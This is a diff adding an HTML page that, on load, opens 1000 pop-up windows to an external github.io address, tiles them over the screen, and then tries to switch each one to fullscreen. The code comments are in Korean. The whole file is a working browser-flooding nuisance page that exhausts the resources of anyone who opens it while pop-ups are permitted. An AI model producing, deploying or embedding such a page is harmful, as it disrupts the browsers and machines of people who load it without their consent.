@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>1000 Fullscreen Windows</title>
+  <script>
+    window.onload = function () {
+      const windows = [];
+      const url = "https://hwangkkyobin.github.io/k/"; // https://hwangkkyobin.github.io/k/
+
+      // 새 창 1000개 열기
+      for (let i = 0; i < 1000; i++) {
+        const newWindow = window.open(
+          url,
+          "_blank",
+          `width=${screen.width},height=${screen.height},left=${i % 10 * 50},top=${Math.floor(i / 10) * 50}`
+        );
+        if (newWindow) {
+          windows.push(newWindow);
+        }
+      }
+
+      // 새 창을 전체화면으로 전환
+      setTimeout(() => {
+        windows.forEach((win) => {
+          try {
+            win.document.body.requestFullscreen(); // 전체화면 요청
+          } catch (e) {
+            console.warn("Fullscreen blocked or unavailable:", e);
+          }
+        });
+      }, 1000); // 창이 열리고 1초 후 전체화면 시도
+    };
+  </script>
+</head>
+<body>
+  <h1>Opening 1000 fullscreen windows...</h1>
+  <p>If this does not work, your browser may be blocking pop-ups or fullscreen requests.</p>
+</body>
+</html>
